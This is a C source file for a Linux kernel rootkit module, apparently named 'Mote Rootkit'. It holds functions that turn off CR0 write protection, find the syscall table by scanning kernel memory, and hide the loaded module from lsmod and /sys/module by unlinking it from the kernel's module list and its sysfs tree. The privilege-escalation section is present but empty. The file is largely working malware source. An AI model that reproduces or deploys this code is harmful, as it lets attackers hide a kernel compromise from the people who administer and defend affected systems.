/**
Author: Mote
File: motekit.c
**/

#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
// kmalloc, kfree.
# include <linux/slab.h>
// __NR_close.
# include <linux/syscalls.h>


#include "motekit.h"



// ========== WRITE_PROTECTION HELPER ==========
// TODO: Consider race condition on SMP systems.
void
disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}


// TODO: Consider race condition on SMP systems.
void
enable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}
// ========== END WRITE_PROTECTION HELPER ==========

// ========== MODULE HELPER ==========

static struct list_head *module_previous;
static struct kernfs_node *node;
static char module_hidden = 0;

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name,
            const void *ns)
{
    /* compare hash value */
    if (hash != kn->hash)
        return hash - kn->hash;

    /* compare ns */
    if (ns != kn->ns)
        return ns - kn->ns;

    /* compare name */
    return strcmp(name, kn->name);
}

void rb_add(struct kernfs_node *node)
{
    struct rb_node **child = &node->parent->dir.children.rb_node;
    struct rb_node *parent = NULL;

    while (*child)
    {
        struct kernfs_node *pos;
        int result;

        /* cast rb_node to kernfs_node */
        pos = rb_entry(*child, struct kernfs_node, rb);

        /* 
		 * traverse the rbtree from root to leaf (until correct place found)
		 * next level down, child from previous level is now the parent
		 */
        parent = *child;

        /* using result to determine where to put the node */
        result = nodecmp(pos, node->hash, node->name, node->ns);

        if (result < 0)
            child = &pos->rb.rb_left;
        else if (result > 0)
            child = &pos->rb.rb_right;
        else
            return;
    }

    /* add new node and reblance the tree */
    rb_link_node(&node->rb, parent, child);
    rb_insert_color(&node->rb, &node->parent->dir.children);

    /* needed for special cases */
    if (kernfs_type(node) == KERNFS_DIR)
        node->parent->dir.subdirs++;
}


void module_show(void)
{
	if (!module_hidden) return;
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	// recover $ lsmod
	list_add(&THIS_MODULE->list, module_previous); 
	
	// recover $ ls /sys/module/
	rb_add(THIS_MODULE->mkobj.kobj.sd);
	mutex_unlock(&module_mutex);
	module_hidden = !module_hidden;

	//printk("Mote Rootkit: module sucessfully show\n");
}

void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();

	//hide $ lsmod
	list_del(&THIS_MODULE->list);

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	//hide $ ls /sys/module/
	node = THIS_MODULE->mkobj.kobj.sd;
	rb_erase(&node->rb, &node->parent->dir.children);
	node->rb.__rb_parent_color = (unsigned long)(&node->rb);

	mutex_unlock(&module_mutex);

	module_hidden = !module_hidden;
	//printk("Mote Rootkit: module sucessfully hide\n");
}


// ========== END MODULE HELPER ==========


// ========== SYS_CALL_TABLE ==========


// WARN: This can be cheated if someone places a faked
// but unmodified sys_call_table before the real one.
unsigned long **
get_sct_via_sys_close(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}


unsigned long **
get_sct(void)
{
    return get_sct_via_sys_close();
}



// ========== END SYS_CALL_TABLE ==========


// ========== GET ROOT PRIVILEGE ==========


// ========== END GET ROOT PRIVILEGE ==========





